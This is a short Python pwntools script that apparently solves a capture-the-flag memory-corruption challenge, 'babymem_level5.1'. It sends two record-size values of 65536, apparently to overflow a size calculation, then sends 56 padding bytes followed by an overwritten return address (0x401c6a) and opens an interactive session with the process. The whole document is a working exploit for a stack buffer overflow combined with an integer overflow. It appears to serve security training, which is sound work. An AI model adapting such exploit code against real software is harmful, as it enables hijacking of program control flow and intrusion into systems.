from pwn import *

p = process('/challenge/babymem_level5.1')

p.recvuntil('Number of payload records to send:')
p.sendline(b'65536')

p.recvuntil('Size of each payload record:')
p.sendline(b'65536')

payload = b'a' * 56 + p64(0x401c6a) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

